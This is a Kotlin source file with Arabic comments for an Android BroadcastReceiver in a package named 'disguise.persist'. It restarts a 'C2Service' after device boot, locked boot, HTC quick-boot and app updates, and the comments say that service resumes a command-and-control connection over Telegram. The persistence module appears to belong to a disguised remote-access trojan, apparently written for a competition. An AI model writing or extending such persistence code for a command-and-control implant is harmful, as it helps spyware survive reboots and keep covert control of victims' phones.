package com.example.disguise.persist

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.example.disguise.core.C2Service

/**
 * BootReceiver — يعيد تشغيل C2Service تلقائياً بعد إعادة تشغيل الهاتف.
 *
 * كيف يعمل:
 * - النظام يرسل بث BOOT_COMPLETED بعد اكتمال الإقلاع.
 * - نستقبل البث ونستدعي C2Service.start(context).
 * - الخدمة تبدأ كـ Foreground Service وتستأنف الاتصال بتيليجرام.
 *
 * قيود Android 11+:
 * - يجب التصريح بـ RECEIVE_BOOT_COMPLETED في Manifest (موجود).
 * - يجب أن يكون التطبيق قد شُغّل مرة واحدة على الأقل بعد التثبيت
 *   (لا يمكن لـ BootReceiver أن يعمل قبل ذلك — هذا قيد نظام).
 * - Android 14+ قد يؤخر تشغيل التطبيقات في الخلفية بعد الإقلاع
 *   (JobScheduler أو WorkManager قد يكون أكثر موثوقية، لكن
 *   BroadcastReceiver يبقى الخيار الأبسط والأسرع للمسابقة).
 *
 * ملاحظة: بعض الشركات المصنعة (Xiaomi, Huawei, Samsung) لديها
 * مديري طاقة عدوانيون قد يمنعون التشغيل التلقائي. في هذه الحالة
 * يحتاج المستخدم إلى تفعيل "Autostart" يدوياً من إعدادات الشركة.
 */
class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        Log.d(TAG, "onReceive: $action")

        when (action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED,  // Android 7+ (قبل فتح القفل)
            "android.intent.action.QUICKBOOT_POWERON",       // بعض أجهزة HTC
            "com.htc.intent.action.QUICKBOOT_POWERON"         // HTC
            -> {
                Log.d(TAG, "Boot detected, starting C2Service")
                try {
                    C2Service.start(context)
                } catch (e: Exception) {
                    Log.e(TAG, "failed to start C2Service: ${e.message}", e)
                }
            }

            // عند تحديث التطبيق، نعيد التشغيل أيضاً
            Intent.ACTION_MY_PACKAGE_REPLACED -> {
                Log.d(TAG, "Package replaced, restarting C2Service")
                try {
                    C2Service.start(context)
                } catch (e: Exception) {
                    Log.e(TAG, "failed to restart after update: ${e.message}", e)
                }
            }

            // عند إعادة تشغيل الجهاز من وضع recovery (نادر)
            "android.intent.action.REBOOT" -> {
                Log.d(TAG, "Reboot detected")
            }
        }
    }
}